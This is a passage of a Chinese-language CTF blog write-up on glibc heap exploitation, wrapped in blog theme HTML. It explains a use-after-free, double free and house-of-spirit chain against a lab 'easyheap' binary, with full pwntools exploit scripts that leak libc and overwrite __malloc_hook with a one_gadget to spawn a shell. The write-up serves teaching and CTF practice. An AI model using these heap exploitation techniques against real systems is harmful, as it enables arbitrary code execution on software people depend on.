class="string">''</span></span><br><span class="line">py += shellcode64</span><br><span class="line">py = py.ljust(<span class="number">46</span>,<span class="string">'a'</span>)</span><br><span class="line">py += <span class="string">'kk'</span></span><br><span class="line">sd(py)</span><br><span class="line">ru(<span class="string">'kk'</span>)</span><br><span class="line">stack = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack---&gt;"</span> + hex(stack)</span><br><span class="line">fake_stack = stack - <span class="number">0xb0</span></span><br><span class="line">shellcode_addr = stack - <span class="number">0x50</span></span><br><span class="line">ru(<span class="string">"give me your id ~~?"</span>)</span><br><span class="line">sl(str(<span class="number">0x50</span>))</span><br><span class="line">ru(<span class="string">"give me money~"</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">py = py.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)</span><br><span class="line">py += p64(fake_stack)</span><br><span class="line">sd(py)</span><br><span class="line">free()</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">py += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">py += p64(shellcode_addr)</span><br><span class="line">py = py.ljust(<span class="number">48</span>,<span class="string">'\x00'</span>)</span><br><span class="line">malloc(<span class="number">0x50</span>,py)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>构造好就直接打了，这题不难，所以综上来看就是之前总结的思路。</p>
+<p>3、再来一题：</p>
+<p>这题比较巧妙，结合的知识点还是不错的，下面来看看：</p>
+<p><img src="/blog_img/1571643785557.png" alt="57164378555"></p>
+<p><img src="/blog_img/1571643954457.png" alt="57164395445"></p>
+<p>熟悉的菜单题，free函数有UAF漏洞，这里show函数被限制了，只有变量为0xDEADBEEFDEADBEEF才能输出，但是输入的name和info刚好在0x602090的上面和下面，很自然想到house of spirit去伪造堆块再申请出来，修改变量即可，但是由于没有堆地址覆盖，所以正常free掉这个fake_chunk是无法实现的，但是可以利用UAF漏洞，如果能实现double free的话，就可以写入FD指针，从而申请出来。</p>
+<p><img src="/blog_img/1571643804884.png" alt="57164380488"></p>
+<p>malloc的功能，能申请的堆块在fastbin以内(0x80)，正常的输入content</p>
+<p><img src="/blog_img/1571644797589.png" alt="57164479758"></p>
+<p>这是666时，这里使用第4次时，会提示付出代价，但是跳过再次使用666，就可以无限次使用了，calloc的功能，申请0xA0的堆块，正常读入content，free有UAF漏洞。</p>
+<p><img src="/blog_img/1571645287924.png" alt="57164528792"></p>
+<p>好了，到这里程序就分析完了，接着就是漏洞利用思路：</p>
+<p>1、double free的实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">magic(<span class="number">2</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">magic(<span class="number">1</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">'ffff'</span>)</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'gggg'</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'hhhh'</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'oooo'</span>)</span><br><span class="line">free()</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'gggg'</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>
+
+<p>解释下，先申请0xA0的堆块，后面0x40格挡，再free掉0xA0，malloc切割出0x60，这时，由于UAF，虽然ptr处的指针还是0xA0的堆块指针，但是size变成了0x60，我们再次malloc时，得到的是新的堆块，指针放到buf中，这样buf和ptr中都有0x60的堆块指针，121实现doublefree。</p>
+<p>2、将fake_chunk写入FD，申请出来再改写变量，这里同时可以往0x602060的FD写入0x602060，伪造double free，这样就可以再次使用这个堆块了（类似ubuntu18下的tcache的dbfree）。</p>
+<p>3、show出puts的got，得到真实地址，接着再申请得到0x602060，改写FD得到malloc_hook-0x23处的fake_chunk，申请出来改写malloc_hook为onegadget</p>
+<p>4、由于show后关闭了输出，onegadget一直打不通，realloc调整偏移也是不行，这里师兄提示说dbfree触发malloc_printer,会调用malloc触发malloc_hook，于是才打通了</p>
+<p>上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./easyheap'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./easyheap'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'192.168.100.20'</span>,<span class="number">50001</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.18.so'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"input the size"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"please input your content"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span><span class="params">(choice,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'666'</span>)</span><br><span class="line">    <span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">        ru(<span class="string">"build or free?"</span>)</span><br><span class="line">        sl(str(choice))</span><br><span class="line">        ru(<span class="string">"please input your content"</span>)</span><br><span class="line">        sd(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ru(<span class="string">"build or free?"</span>)</span><br><span class="line">        sl(str(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc1</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free1</span><span class="params">()</span>:</span></span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic_calloc</span><span class="params">(content)</span>:</span></span><br><span class="line">	sl(<span class="string">'666'</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic_free</span><span class="params">()</span>:</span></span><br><span class="line">	sl(<span class="string">'666'</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">ru(<span class="string">"please input your username:"</span>)</span><br><span class="line">sl(p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x602060</span>))</span><br><span class="line">ru(<span class="string">"please input your info:"</span>)</span><br><span class="line">sl(p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line">fake_chunk = <span class="number">0x602060</span></span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">sl(<span class="string">'666'</span>)</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">magic(<span class="number">1</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">'ffff'</span>)</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'gggg'</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'hhhh'</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'oooo'</span>)</span><br><span class="line">free()</span><br><span class="line">magic(<span class="number">2</span>,<span class="string">'gggg'</span>)</span><br><span class="line">free()</span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x602060</span>)*<span class="number">3</span> + p64(puts_got) + p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,py)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">chunk = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>] - <span class="number">0x23</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">"realloc"</span>]</span><br><span class="line">bk(<span class="number">0x000000000400AA2</span>)</span><br><span class="line">ru(<span class="string">"everything has a price"</span>)</span><br><span class="line">malloc1(<span class="number">0x60</span>,p64(chunk))</span><br><span class="line">malloc1(<span class="number">0x60</span>,p64(chunk))</span><br><span class="line"></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'A'</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">0x14</span>)</span><br><span class="line">malloc1(<span class="number">0x60</span>,py)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这道题主要是通过double free来实现将fake_chunk链接到我们的fastbin中，从而申请出来，实现没有free函数覆盖堆地址的house of spirit申请出非法区域。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、原理分析："><span class="toc-number">1.</span> <span class="toc-text">一、原理分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、实战"><span class="toc-number">2.</span> <span class="toc-text">二、实战</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
